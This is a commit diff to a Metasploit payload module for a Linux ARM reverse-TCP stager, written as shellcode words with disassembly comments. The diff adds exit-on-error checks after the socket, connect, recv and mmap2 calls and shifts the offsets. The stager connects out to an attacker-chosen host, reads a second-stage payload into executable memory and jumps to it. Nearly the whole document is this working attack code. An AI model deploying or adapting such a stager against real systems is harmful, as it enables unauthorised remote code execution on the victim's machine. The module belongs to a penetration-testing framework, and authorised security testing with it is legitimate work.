1862900aae36a2567de37d0a9ba6cbde42631ce5
tkmru <i.am.tkmru@gmail.com>
2017-06-12 01:36:13 +0900

    add error handling

--- modules/payloads/stagers/linux/armle/reverse_tcp.rb
+++ modules/payloads/stagers/linux/armle/reverse_tcp.rb
@@ -34,21 +34,25 @@ module MetasploitModule
         {
           'Offsets' =>
             {
-              'LPORT' => [ 182, 'n'    ],
-              'LHOST' => [ 184, 'ADDR' ],
+              'LPORT' => [ 242, 'n'    ],
+              'LHOST' => [ 244, 'ADDR' ],
             },
           'Payload' =>
           [
-            0xe59f70b4,          #        ldr     r7, [pc, #180]    ; set 281(0x119) to r7
+            0xe59f70f0,          #        ldr     r7, [pc, #240]    ; set 281(0x119) to r7
             0xe3a00002,          #        mov     r0, #2
             0xe3a01001,          #        mov     r1, #1
             0xe3a02006,          #        mov     r2, #6
             0xef000000,          #        svc     0x00000000        ; invoke socket
+            0xe3500000,          #        cmp     r0, #0
+            0xba000031,          #        blt     817c <failed>
             0xe1a0c000,          #        mov     ip, r0
             0xe2877002,          #        add     r7, r7, #2        ; set 283(0x11b) to r7
-            0xe28f1090,          #        add     r1, pc, #144      ; set 0x0a1a0002 to r1
+            0xe28f10c4,          #        add     r1, pc, #196      ; set first .word addr to r1
             0xe3a02010,          #        mov     r2, #16
             0xef000000,          #        svc     0x00000000        ; invoke connect
+            0xe3500000,          #        cmp     r0, #0
+            0xba00002a,          #        blt     817c <failed>
             0xe1a0000c,          #        mov     r0, ip
             0xe24dd004,          #        sub     sp, sp, #4
             0xe2877008,          #        add     r7, r7, #8        ; set 291(0x123) to r7
@@ -56,8 +60,10 @@ module MetasploitModule
             0xe3a02004,          #        mov     r2, #4
             0xe3a03000,          #        mov     r3, #0
             0xef000000,          #        svc     0x00000000        ; invoke recv
+            0xe3500000,          #        cmp     r0, #0
+            0xba000021,          #        blt     817c <failed>
             0xe59d1000,          #        ldr     r1, [sp]
-            0xe59f3070,          #        ldr     r3, [pc, #112]    ; set 0xfffff000 to r3
+            0xe59f3094,          #        ldr     r3, [pc, #148]    ; set 0xfffff000 to r3
             0xe0011003,          #        and     r1, r1, r3
             0xe3a02001,          #        mov     r2, #1
             0xe1a02602,          #        lsl     r2, r2, #12
@@ -65,25 +71,37 @@ module MetasploitModule
             0xe3a070c0,          #        mov     r7, #192          ; set 192(0xC0) to r7
             0xe3e00000,          #        mvn     r0, #0            ; set 0xffffffff to r0
             0xe3a02007,          #        mov     r2, #7
-            0xe59f3054,          #        ldr     r3, [pc, #84]     ; set 0x1022 to r3
+            0xe59f3078,          #        ldr     r3, [pc, #120]    ; set r3 to 0x1022
             0xe1a04000,          #        mov     r4, r0
             0xe3a05000,          #        mov     r5, #0
             0xef000000,          #        svc     0x00000000        ; invoke mmap2
+            0xe3500000,          #        cmp     r0, #0
+            0xba000012,          #        blt 817c <failed>
             0xe2877063,          #        add     r7, r7, #99       ; set 291(0x123) to r7
             0xe1a01000,          #        mov     r1, r0
             0xe1a0000c,          #        mov     r0, ip
             0xe3a03000,          #        mov     r3, #0
-            0xe59d2000,          # loop:  ldr     r2, [sp]
+                                 #  loop:
+            0xe59d2000,          #        ldr     r2, [sp]
             0xe2422ffa,          #        sub     r2, r2, #1000
             0xe58d2000,          #        str     r2, [sp]
             0xe3520000,          #        cmp     r2, #0
             0xda000002,          #        ble     80fc <last>
             0xe3a02ffa,          #        mov     r2, #1000
             0xef000000,          #        svc     0x00000000        ; invoke recv
+            0xe3500000,          #        cmp     r0, #0
+            0xba000005,          #        blt     817c <failed>
             0xeafffff7,          #        b       80dc <loop>
-            0xe2822ffa,          # last:  add     r2, r2, #1000
+                                 #  last:
+            0xe2822ffa,          #        add     r2, r2, #1000
             0xef000000,          #        svc     0x00000000        ; invoke recv
+            0xe3500000,          #        cmp r0, #0
+            0xba000000,          #        blt 817c <failed>
             0xe1a0f001,          #        mov     pc, r1
+                                 #  failed:
+            0xe3a07001,          #        mov r7, #1
+            0xe3a00001,          #        mov r0, #1
+            0xef000000,          #        svc 0x00000000
             0x5c110002,          #  .word   0x5c110002
             0x0100007f,          #  .word   0x0100007f
             0x00000119,          #  .word   0x00000119
